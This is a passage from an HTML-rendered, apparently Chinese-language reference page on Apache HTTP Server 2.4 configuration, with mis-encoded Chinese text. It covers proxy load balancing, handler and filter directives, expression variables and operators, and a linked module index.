lbset=1    BalancerMember http://bkup2.example.com:8080 lbset=1    ProxySet lbmethod=byrequests&amp;lt/Proxy&gt;ProxyPass "/images/"  "balancer://myset/"ProxyPassReverse "/images/"  "balancer://myset/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å‡è¡¡å™¨å¯ç”¨"><a href="#å‡è¡¡å™¨å¯ç”¨" class="headerlink" title="å‡è¡¡å™¨å¯ç”¨"></a>å‡è¡¡å™¨å¯ç”¨</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltLocation "/balancer-manager"&gt;    SetHandler balancer-manager    Require host localhost&amp;lt/Location&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å€¼</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td>`ProxyPass [path] !</td><td>url [key=value [key=value â€¦]] [nocanon] [interpolate] [noquery]`</td></tr><tr><td><code>BalancerMember [balancerurl] url [key=value [key=value ...]]</code></td><td>å‘è´Ÿè½½å‡è¡¡ç»„æ·»åŠ æˆå‘˜</td></tr><tr><td><code>ProxyPassReverse [path] url [interpolate]</code></td><td>è°ƒæ•´ä»åå‘ä»£ç†æœåŠ¡å™¨å‘é€çš„ HTTP å“åº”æ ‡å¤´ä¸­çš„ URL</td></tr><tr><td><code>BalancerMember [balancerurl] url [key=value [key=value ...]]</code></td><td>å‘è´Ÿè½½å‡è¡¡ç»„æ·»åŠ æˆå‘˜</td></tr><tr><td><code>ProxySet url key=value [key=value ...]</code></td><td>è®¾ç½®å„ç§ä»£ç†å¹³è¡¡å™¨æˆ–æˆå‘˜å‚æ•°</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="htaccessæ–‡ä»¶"><a href="#htaccessæ–‡ä»¶" class="headerlink" title=".htaccessæ–‡ä»¶"></a>.htaccessæ–‡ä»¶</h3><p>å’Œ<code>httpd.conf</code>çš„è¯­æ³•ä¸€æ ·ï¼Œä½œç”¨äºå½“å‰ç›®å½•ï¼Œä¸€èˆ¬ç”¨æ¥è®¾ç½®å•ä¸ªåŠŸèƒ½</p><h3 id="å¤„ç†å™¨"><a href="#å¤„ç†å™¨" class="headerlink" title="å¤„ç†å™¨"></a>å¤„ç†å™¨</h3><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>Action action-type cgi-script [virtual]</code></td><td>ä¸ºç‰¹å®šå¤„ç†ç¨‹åºæˆ–å†…å®¹ç±»å‹æ¿€æ´» CGI è„šæœ¬</td></tr><tr><td><code>AddHandler handler-name extension [extension] ...</code></td><td>å°†æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å¤„ç†ç¨‹åº</td></tr><tr><td><code>RemoveHandler extension [extension] ...</code></td><td>åˆ é™¤ä¸€ç»„æ–‡ä»¶æ‰©å±•åçš„ä»»ä½•å¤„ç†ç¨‹åºå…³è”</td></tr><tr><td><code>SetHandler handler-name</code></td><td>none</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><table><thead><tr><th>å±æ€§å€¼</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>FilterChain [+=-@!]filter-name ...</code></td><td>é…ç½®è¿‡æ»¤å™¨é“¾</td></tr><tr><td><code>FilterDeclare filter-name [type]</code></td><td>å£°æ˜ä¸€ä¸ªæ™ºèƒ½è¿‡æ»¤å™¨</td></tr><tr><td><code>FilterProtocol filter-name [provider-name] proto-flags</code></td><td>å£°æ˜ä¸€ä¸ªæ™ºèƒ½è¿‡æ»¤å™¨</td></tr><tr><td><code>FilterProvider filter-name provider-name expression</code></td><td>æ³¨å†Œå†…å®¹è¿‡æ»¤å™¨</td></tr><tr><td><code>AddInputFilter filter[;filter...] extension [extension] ...</code></td><td>å°†æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°å°†å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„è¿‡æ»¤å™¨</td></tr><tr><td><code>AddOutputFilter filter[;filter...] extension [extension] ...</code></td><td>å°†æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°å°†å¤„ç†æ¥è‡ªæœåŠ¡å™¨çš„å“åº”çš„è¿‡æ»¤å™¨</td></tr><tr><td><code>RemoveInputFilter extension [extension] ...</code></td><td>åˆ é™¤ä¸€ç»„æ–‡ä»¶æ‰©å±•åçš„ä»»ä½•è¾“å…¥è¿‡æ»¤å™¨å…³è”</td></tr><tr><td><code>RemoveOutputFilter extension [extension] ...</code></td><td>åˆ é™¤ä¸€ç»„æ–‡ä»¶æ‰©å±•åçš„ä»»ä½•è¾“å‡ºè¿‡æ»¤å™¨å…³è”</td></tr><tr><td><code>ReflectorHeader inputheader [outputheader]</code></td><td>å°†è¾“å…¥æ ‡é¢˜åæ˜ åˆ°è¾“å‡ºæ ‡é¢˜</td></tr><tr><td><code>ExtFilterDefine filtername parameters</code></td><td>å®šä¹‰å¤–éƒ¨è¿‡æ»¤å™¨</td></tr><tr><td><code>ExtFilterOptions option [option] ...</code></td><td>é…ç½® <code>mod_ext_filter </code>é€‰é¡¹</td></tr><tr><td><code>SetInputFilter filter[;filter...]</code></td><td>è®¾ç½®å°†å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å’Œ POST è¾“å…¥çš„è¿‡æ»¤å™¨</td></tr><tr><td><code>SetOutputFilter filter[;filter...]</code></td><td>è®¾ç½®å°†å¤„ç†æ¥è‡ªæœåŠ¡å™¨çš„å“åº”çš„è¿‡æ»¤å™¨</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><table><thead><tr><th>HTTPå˜é‡</th></tr></thead><tbody><tr><td><code>HTTP_ACCEPT</code></td></tr><tr><td><code>HTTP_COOKIE</code></td></tr><tr><td><code>HTTP_FORWARDED</code></td></tr><tr><td><code>HTTP_HOST</code></td></tr><tr><td><code>HTTP_PROXY_CONNECTION</code></td></tr><tr><td><code>HTTP_REFERER</code></td></tr><tr><td><code>HTTP_USER_AGENT</code></td></tr></tbody></table><table><thead><tr><th>åå­—</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>REQUEST_METHOD</code></td><td>ä¼ å…¥è¯·æ±‚çš„ HTTP æ–¹æ³•ï¼ˆä¾‹å¦‚<code>GET</code>)</td></tr><tr><td><code>REQUEST_SCHEME</code></td><td>è¯¥è®¡åˆ’æ˜¯è¯·æ±‚URIçš„ä¸€éƒ¨åˆ†</td></tr><tr><td><code>REQUEST_URI</code></td><td>è¯·æ±‚URIçš„è·¯å¾„éƒ¨åˆ†</td></tr><tr><td><code>DOCUMENT_URI</code></td><td>å’Œ<code>REQUEST_URI</code>ä¸€æ ·</td></tr><tr><td><code>REQUEST_FILENAME</code></td><td>å¦‚æœå½“æ—¶æœåŠ¡å™¨å·²ç»ç¡®å®šäº†è¯¥è·¯å¾„ï¼Œä¸è¯·æ±‚åŒ¹é…çš„æ–‡ä»¶æˆ–è„šæœ¬çš„å®Œæ•´æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ã€‚å¦åˆ™ï¼Œä¾‹å¦‚åœ¨è™šæ‹Ÿä¸»æœºä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨æ—¶ï¼Œä¸ <code>REQUEST_FILENAME REQUEST_URI </code>ç›¸åŒçš„å€¼</td></tr><tr><td><code>SCRIPT_FILENAME</code></td><td>å’Œ<code>REQUEST_FILENAME</code>ä¸€æ ·</td></tr><tr><td><code>LAST_MODIFIED</code></td><td>å¦‚æœæ­¤æ—¶æœåŠ¡å™¨å·²ç»ç¡®å®šè¯¥æ ¼å¼ä¸­æ–‡ä»¶ä¸Šæ¬¡ä¿®æ”¹çš„æ—¥æœŸå’Œæ—¶é—´ï¼Œåˆ™å‚ç…§è¯¥æ—¥æœŸå’Œæ—¶é—´è¿›è¡Œå¼•ç”¨ã€‚<code>20101231235959</code> <code>LAST_MODIFIED</code></td></tr><tr><td><code>SCRIPT_USER</code></td><td>è„šæœ¬æ‰€æœ‰è€…çš„ç”¨æˆ·åã€‚</td></tr><tr><td><code>SCRIPT_GROUP</code></td><td>è„šæœ¬ç»„çš„ç»„åã€‚</td></tr><tr><td><code>PATH_INFO</code></td><td>å°¾éšè·¯å¾„åç§°ä¿¡æ¯ï¼Œè¯·å‚é˜…<code>AcceptPathInfo</code></td></tr><tr><td><code>QUERY_STRING</code></td><td>å½“å‰è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²</td></tr><tr><td><code>IS_SUBREQ</code></td><td>å¦‚æœå½“å‰è¯·æ±‚æ˜¯æ¬¡è¦è¯·æ±‚<code>true</code>ï¼Œå¦åˆ™<code>false</code></td></tr><tr><td><code>THE_REQUEST</code></td><td>å®Œæ•´çš„è¯·æ±‚è¡Œï¼ˆä¾‹å¦‚â€<code>GET /index.html HTTP/1.1</code>â€œ)</td></tr><tr><td><code>REMOTE_ADDR</code></td><td>è¿œç¨‹ä¸»æœºçš„ IP åœ°å€</td></tr><tr><td><code>REMOTE_PORT</code></td><td>è¿œç¨‹ä¸»æœºçš„ç«¯å£ï¼ˆ2.4.26 åŠä»¥åï¼‰</td></tr><tr><td><code>REMOTE_HOST</code></td><td>è¿œç¨‹ä¸»æœºçš„ä¸»æœºåç§°</td></tr><tr><td><code>REMOTE_USER</code></td><td>å·²éªŒè¯ç”¨æˆ·çš„åç§°ï¼ˆåœ¨<code>&amp;ltIF&gt;</code>ä¸å¯ç”¨ï¼‰</td></tr><tr><td><code>REMOTE_IDENT</code></td><td><code>mod_ident</code> è®¾ç½®çš„ç”¨æˆ·å</td></tr><tr><td><code>SERVER_NAME</code></td><td>å½“å‰çš„è™šæ‹Ÿ<code>ServerName</code></td></tr><tr><td><code>SERVER_PORT</code></td><td>å½“å‰vhostçš„æœåŠ¡å™¨ç«¯å£ï¼Œè¯·å‚é˜…<code>ServerName</code></td></tr><tr><td><code>SERVER_ADMIN</code></td><td>å½“å‰çš„è™šæ‹Ÿ<code>ServerAdmin</code></td></tr><tr><td><code>SERVER_PROTOCOL</code></td><td>è¯·æ±‚æ‰€ä½¿ç”¨çš„åè®®</td></tr><tr><td><code>DOCUMENT_ROOT</code></td><td>å½“å‰çš„è™šæ‹Ÿ<code>DocumentRoot</code></td></tr><tr><td><code>AUTH_TYPE</code></td><td>é…ç½®ï¼ˆä¾‹å¦‚<code>AuthType basic</code>)</td></tr><tr><td><code>CONTENT_TYPE</code></td><td>å“åº”çš„å†…å®¹ç±»å‹ï¼ˆåœ¨ <code>&amp;ltIf&gt;</code> é—´ä¸å¯ç”¨ï¼‰</td></tr><tr><td><code>HANDLER</code></td><td>åˆ›å»ºå“åº”çš„<a href="http://httpd.apache.org/docs/2.4/handler.html">å¤„ç†ç¨‹åº</a>çš„åç§°</td></tr><tr><td><code>HTTP2</code></td><td>å¦‚æœè¯·æ±‚ä½¿ç”¨http/2<code>on</code>ï¼Œå¦åˆ™<code>off</code></td></tr><tr><td><code>HTTPS</code></td><td>å¦‚æœè¯·æ±‚ä½¿ç”¨https<code>on</code>ï¼Œå¦åˆ™<code>off</code></td></tr><tr><td><code>IPV6</code></td><td>å¦‚æœè¿æ¥ä½¿ç”¨IPv6<code>on</code>ï¼Œå¦åˆ™<code>off</code></td></tr><tr><td><code>REQUEST_STATUS</code></td><td>è¯·æ±‚çš„ HTTP é”™è¯¯çŠ¶æ€ï¼ˆåœ¨<code>&amp;ltIf&gt;</code>é—´ä¸å¯ç”¨ï¼‰)</td></tr><tr><td><code>REQUEST_LOG_ID</code></td><td>è¯·æ±‚çš„é”™è¯¯æ—¥å¿—IDï¼ˆå‚è§<code>ErrorLogFormat</code>)</td></tr><tr><td><code>CONN_LOG_ID</code></td><td>è¿æ¥çš„é”™è¯¯æ—¥å¿—IDï¼ˆå‚è§<code>ErrorLogFormat</code>)</td></tr><tr><td><code>CONN_REMOTE_ADDR</code></td><td>è¿æ¥çš„åŒä¾ª IP åœ°å€ï¼ˆå‚è§æ¨¡å—ï¼‰<code>mod_remoteip</code></td></tr><tr><td><code>CONTEXT_PREFIX</code></td><td></td></tr><tr><td><code>CONTEXT_DOCUMENT_ROOT</code></td><td></td></tr></tbody></table><table><thead><tr><th>åå­—</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>TIME_YEAR</code></td><td>æœ¬å¹´åº¦ï¼ˆä¾‹å¦‚<code>2010</code>)</td></tr><tr><td><code>TIME_MON</code></td><td>å½“æœˆï¼ˆï¼Œâ€¦ï¼Œ<code>0112</code>)</td></tr><tr><td><code>TIME_DAY</code></td><td>æœ¬æœˆçš„å½“å‰æ—¥æœŸï¼ˆï¼Œâ€¦ï¼‰<code>01</code></td></tr><tr><td><code>TIME_HOUR</code></td><td>å½“å‰æ—¶é—´çš„å°æ—¶éƒ¨åˆ†ï¼ˆï¼Œâ€¦ï¼Œ<code>0023</code>)</td></tr><tr><td><code>TIME_MIN</code></td><td>å½“å‰æ—¶é—´çš„åˆ†é’Ÿéƒ¨åˆ†</td></tr><tr><td><code>TIME_SEC</code></td><td>å½“å‰æ—¶é—´çš„ç§’é’Ÿéƒ¨åˆ†</td></tr><tr><td><code>TIME_WDAY</code></td><td>ä¸€å‘¨çš„ä¸€å¤©ï¼ˆä»å‘¨æ—¥å¼€å§‹ï¼‰<code>0</code></td></tr><tr><td><code>TIME</code></td><td>æ ¼å¼ä¸­çš„æ—¥æœŸå’Œæ—¶é—´<code>20101231235959</code></td></tr><tr><td><code>SERVER_SOFTWARE</code></td><td>æœåŠ¡å™¨ç‰ˆæœ¬å­—ç¬¦ä¸²</td></tr><tr><td><code>API_VERSION</code></td><td>API ç‰ˆæœ¬çš„æ—¥æœŸï¼ˆæ¨¡å—é­”æ³•æ•°å­—ï¼‰</td></tr></tbody></table><h4 id="äºŒè¿›åˆ¶å˜é‡"><a href="#äºŒè¿›åˆ¶å˜é‡" class="headerlink" title="äºŒè¿›åˆ¶å˜é‡"></a>äºŒè¿›åˆ¶å˜é‡</h4><table><thead><tr><th align="left">åå­—</th><th align="left">å…¶ä»–å½¢å¼</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>==</code></td><td align="left"><code>=</code></td><td align="left">å­—ç¬¦ä¸²å‡ç­‰</td></tr><tr><td align="left"><code>!=</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²ä¸å¹³ç­‰</td></tr><tr><td align="left"><code>&amp;lt</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²å°‘äº</td></tr><tr><td align="left"><code>&amp;lt=</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²å°äºæˆ–ç­‰äº</td></tr><tr><td align="left"><code>&gt;</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²å¤§äº</td></tr><tr><td align="left"><code>&gt;=</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²å¤§äºæˆ–ç­‰äº</td></tr><tr><td align="left"><code>=~</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²ä¸å¸¸è§„è¡¨è¾¾æ–¹å¼åŒ¹é…</td></tr><tr><td align="left"><code>!~</code></td><td align="left"></td><td align="left">å­—ç¬¦ä¸²ä¸å¸¸è§„è¡¨è¾¾ä¸åŒ¹é…</td></tr><tr><td align="left"><code>-eq</code></td><td align="left"><code>eq</code></td><td align="left">æ•´æ•°å¹³ç­‰</td></tr><tr><td align="left"><code>-ne</code></td><td align="left"><code>ne</code></td><td align="left">æ•´æ•°ä¸å¹³ç­‰</td></tr><tr><td align="left"><code>-lt</code></td><td align="left"><code>lt</code></td><td align="left">æ•´æ•°å°äº</td></tr><tr><td align="left"><code>-le</code></td><td align="left"><code>le</code></td><td align="left">æ•´æ•°å°äºæˆ–ç›¸ç­‰</td></tr><tr><td align="left"><code>-gt</code></td><td align="left"><code>gt</code></td><td align="left">æ•´æ•°å¤§äº</td></tr><tr><td align="left"><code>-ge</code></td><td align="left"><code>ge</code></td><td align="left">æ•´æ•°å¤§äºæˆ–ç›¸ç­‰</td></tr></tbody></table><h4 id="ç»Ÿä¸€å˜é‡"><a href="#ç»Ÿä¸€å˜é‡" class="headerlink" title="ç»Ÿä¸€å˜é‡"></a>ç»Ÿä¸€å˜é‡</h4><table><thead><tr><th align="left">åå­—</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>-d</code></td><td align="left">å‚æ•°è¢«è§†ä¸ºæ–‡ä»¶åã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨å¹¶ä¸”æ˜¯ç›®å½•ï¼Œåˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-e</code></td><td align="left">å‚æ•°è¢«è§†ä¸ºæ–‡ä»¶åã€‚å¦‚æœå­˜åœ¨æ–‡ä»¶ï¼ˆæˆ–ç›®å½•å’Œç‰¹æ®Šæ–‡ä»¶ï¼‰ï¼Œåˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-f</code></td><td align="left">å‚æ•°è¢«è§†ä¸ºæ–‡ä»¶åã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨å¹¶ä¸”æ˜¯å¸¸è§„æ–‡ä»¶ï¼Œåˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-s</code></td><td align="left">å‚æ•°è¢«è§†ä¸ºæ–‡ä»¶åã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”ä¸æ˜¯ç©ºçš„ï¼Œåˆ™æ­£ç¡®</td></tr><tr><td align="left"><code>-L</code></td><td align="left">å‚æ•°è¢«è§†ä¸ºæ–‡ä»¶åã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨å¹¶ä¸”æ˜¯ç¬¦å·é“¾æ¥ï¼Œåˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-h</code></td><td align="left">å‚æ•°è¢«è§†ä¸ºæ–‡ä»¶åã€‚çœŸå®çš„ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œæ˜¯ç¬¦å·é“¾æ¥ï¼ˆä¸<code>-L</code>ç›¸ä¼¼)</td></tr><tr><td align="left"><code>-F</code></td><td align="left">å¦‚æœå­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶ï¼Œåˆ™å¯ä»¥é€šè¿‡è¯¥è·¯å¾„çš„æ‰€æœ‰æœåŠ¡å™¨å½“å‰é…ç½®çš„è®¿é—®æ§åˆ¶è¿›è¡Œè®¿é—®ã€‚</td></tr><tr><td align="left"><code>-U</code></td><td align="left">å¦‚æœå­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„URLï¼Œåˆ™å¯ä»¥é€šè¿‡è¯¥è·¯å¾„çš„æ‰€æœ‰æœåŠ¡å™¨å½“å‰é…ç½®çš„è®¿é—®æ§åˆ¶è¿›è¡Œè®¿é—®ã€‚</td></tr><tr><td align="left"><code>-A</code></td><td align="left">åˆ«å<code>-U</code></td></tr><tr><td align="left"><code>-n</code></td><td align="left">å¦‚æœå­—ç¬¦ä¸²ä¸æ˜¯ç©ºçš„ï¼Œåˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-z</code></td><td align="left">å¦‚æœå­—ç¬¦ä¸²æ˜¯ç©ºçš„ï¼Œåˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-T</code></td><td align="left">å¦‚æœå­—ç¬¦ä¸²ä¸ºç©º,â€â€,â€â€,â€â€ æˆ– â€œâ€ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œåˆ™ä¸º Falseï¼Œå¦åˆ™ä¸ºçœŸ</td></tr><tr><td align="left"><code>-R</code></td><td align="left">ä¸<code>%{REMOTE_ADDR} -ipmatch ...</code>ç›¸åŒï¼Œä½†æ•ˆç‡æ›´é«˜</td></tr></tbody></table><h4 id="åŠŸèƒ½å˜é‡"><a href="#åŠŸèƒ½å˜é‡" class="headerlink" title="åŠŸèƒ½å˜é‡"></a>åŠŸèƒ½å˜é‡</h4><table><thead><tr><th align="left">åå­—</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>req</code>,<code>http</code></td><td align="left">è·å– HTTP è¯·æ±‚æ ‡é¢˜ï¼›æ ‡å¤´åç§°å¯ä»¥æ·»åŠ åˆ° Vary æ ‡å¤´</td></tr><tr><td align="left"><code>req_novary</code></td><td align="left">ä¸ ç›¸åŒï¼Œä½†ä¸ä¼šå°†æ ‡å¤´åç§°æ·»åŠ åˆ° Vary æ ‡å¤´ä¸­</td></tr><tr><td align="left"><code>resp</code></td><td align="left">è·å– HTTP å“åº”å¤´ï¼ˆå¤§å¤šæ•°å“åº”æ ‡é¢˜åœ¨<code>&amp;ltIf&gt;</code>é—´å°šæœªè®¾ç½®ï¼‰</td></tr><tr><td align="left"><code>reqenv</code></td><td align="left">æŸ¥æ‰¾è¯·æ±‚ç¯å¢ƒå˜é‡ï¼ˆä½œä¸ºå¿«æ·æ–¹å¼ï¼Œä¹Ÿå¯ç”¨äºè®¿é—®å˜é‡ï¼‰</td></tr><tr><td align="left"><code>osenv</code></td><td align="left">æŸ¥æ‰¾æ“ä½œç³»ç»Ÿç¯å¢ƒå˜é‡</td></tr><tr><td align="left"><code>note</code></td><td align="left">æŸ¥æ‰¾è¯·æ±‚è¯´æ˜</td></tr><tr><td align="left"><code>env</code></td><td align="left">è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…</td></tr><tr><td align="left"><code>tolower</code></td><td align="left">å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</td></tr><tr><td align="left"><code>toupper</code></td><td align="left">å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td align="left"><code>escape</code></td><td align="left">åœ¨ %hex ç¼–ç ä¸­è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</td></tr><tr><td align="left"><code>unescape</code></td><td align="left">Unescape %hex ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå•ç‹¬ç•™ä¸‹ç¼–ç çš„æ–œæ ï¼›å¦‚æœæ‰¾åˆ° %00ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²</td></tr><tr><td align="left"><code>base64</code></td><td align="left">ä½¿ç”¨ base64 ç¼–ç å¯¹å­—ç¬¦ä¸²è¿›è¡Œç¼–ç </td></tr><tr><td align="left"><code>unbase64</code></td><td align="left">è§£ç base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ‰¾åˆ°0x00åˆ™è¿”å›æˆªæ–­çš„å­—ç¬¦ä¸²</td></tr><tr><td align="left"><code>md5</code></td><td align="left">ä½¿ç”¨ MD5 å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ•£åˆ—ï¼Œç„¶åä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç å¯¹æ•£åˆ—è¿›è¡Œç¼–ç </td></tr><tr><td align="left"><code>sha1</code></td><td align="left">ä½¿ç”¨ SHA1 å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ•£åˆ—ï¼Œç„¶åä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç å¯¹æ•£åˆ—è¿›è¡Œç¼–ç </td></tr><tr><td align="left"><code>file</code></td><td align="left">ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼ˆåŒ…æ‹¬è¡Œå°¾ï¼Œå¦‚æœå­˜åœ¨ï¼‰</td></tr><tr><td align="left"><code>filemod</code></td><td align="left">è¿”å›æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼ˆå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨æˆ–ä¸æ˜¯å¸¸è§„æ–‡ä»¶ï¼Œåˆ™è¿”å› 0ï¼‰</td></tr><tr><td align="left"><code>filesize</code></td><td align="left">è¿”å›æ–‡ä»¶çš„å¤§å°ï¼ˆå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨æˆ–ä¸æ˜¯å¸¸è§„æ–‡ä»¶ï¼Œåˆ™è¿”å› 0ï¼‰</td></tr></tbody></table><h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><p><a href="http://httpd.apache.org/docs/2.4/mod/">æ¨¡å—ç´¢å¼• - Apache HTTP æœåŠ¡å™¨ ç‰ˆæœ¬ 2.4</a></p><h4 id="æ ¸å¿ƒä¸å¤šå¤„ç†æ¨¡å—-MPM"><a href="#æ ¸å¿ƒä¸å¤šå¤„ç†æ¨¡å—-MPM" class="headerlink" title="æ ¸å¿ƒä¸å¤šå¤„ç†æ¨¡å—(MPM)"></a>æ ¸å¿ƒä¸å¤šå¤„ç†æ¨¡å—(MPM)</h4><p><a href="http://httpd.apache.org/docs/2.4/mod/core.html">core</a></p><p>å§‹ç»ˆå¯ç”¨çš„æ ¸å¿ƒ Apache HTTP Server åŠŸèƒ½</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpm_common.html">mpm_common</a></p><p>ç”±å¤šä¸ªå¤šå¤„ç†æ¨¡å— (MPM) å®ç°çš„ä¸€ç»„æŒ‡ä»¤</p><p><a href="http://httpd.apache.org/docs/2.4/mod/event.html">event</a></p><p>MPM çš„ä¸€ç§å˜ä½“ï¼Œå…¶ç›®æ ‡æ˜¯ä»…ä¸ºä¸æ´»åŠ¨å¤„ç†å·¥ä½œè€…çš„è¿æ¥æ¶ˆè€—çº¿ç¨‹</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpm_netware.html">mpm_netware</a></p><p>å®ç°ä¸“ä¸º Novell NetWare ä¼˜åŒ–çš„çº¿ç¨‹ Web æœåŠ¡å™¨çš„å¤šå¤„ç†æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpmt_os2.html">mpmt_os2</a></p><p>ç”¨äº OS/2 çš„æ··åˆå¤šè¿›ç¨‹ã€å¤šçº¿ç¨‹ MPM</p><p><a href="http://httpd.apache.org/docs/2.4/mod/prefork.html">prefork</a></p><p>å®ç°ä¸€ä¸ªéçº¿ç¨‹çš„ã€é¢„åˆ†å‰çš„ Web æœåŠ¡å™¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpm_winnt.html">mpm_winnt</a></p><p>ä¸º Windows NT ä¼˜åŒ–çš„å¤šå¤„ç†æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/worker.html">worker</a></p><p>å®ç°æ··åˆå¤šçº¿ç¨‹å¤šè¿›ç¨‹ Web æœåŠ¡å™¨çš„å¤šå¤„ç†æ¨¡å—</p><h4 id="å…¶ä»–æ¨¡å—"><a href="#å…¶ä»–æ¨¡å—" class="headerlink" title="å…¶ä»–æ¨¡å—"></a>å…¶ä»–æ¨¡å—</h4><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_access_compat.html">mod_access_compat</a></p><p>åŸºäºä¸»æœºï¼ˆåç§°æˆ– IP åœ°å€ï¼‰çš„ç»„æˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_actions.html">mod_actions</a></p><p>æ ¹æ®åª’ä½“ç±»å‹æˆ–è¯·æ±‚æ–¹æ³•æ‰§è¡Œ CGI è„šæœ¬</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_alias.html">mod_alias</a></p><p>æä¾›åœ¨æ–‡æ¡£æ ‘ä¸­æ˜ å°„ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ä¸åŒéƒ¨åˆ†å’Œ URL é‡å®šå‘</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_allowmethods.html">mod_allowmethods</a></p><p>è½»æ¾é™åˆ¶å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨çš„ HTTP æ–¹æ³•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_asis.html">mod_asis</a></p><p>å‘é€åŒ…å«è‡ªå·±çš„ HTTP æ ‡å¤´çš„æ–‡ä»¶</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_auth_basic.html">mod_auth_basic</a></p><p>åŸºæœ¬ HTTP èº«ä»½éªŒè¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_auth_digest.html">mod_auth_digest</a></p><p>ä½¿ç”¨ MD5 æ‘˜è¦èº«ä»½éªŒè¯çš„ç”¨æˆ·èº«ä»½éªŒè¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_auth_form.html">mod_auth_form</a></p><p>è¡¨å•è®¤è¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_anon.html">mod_authn_anon</a></p><p>å…è®¸â€œåŒ¿åâ€ç”¨æˆ·è®¿é—®ç»è¿‡èº«ä»½éªŒè¯çš„åŒºåŸŸ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_core.html">mod_authn_core</a></p><p>æ ¸å¿ƒèº«ä»½éªŒè¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_dbd.html">mod_authn_dbd</a></p><p>ä½¿ç”¨ SQL æ•°æ®åº“è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_dbm.html">mod_authn_dbm</a></p><p>ä½¿ç”¨ DBM æ–‡ä»¶è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯</p><p><a 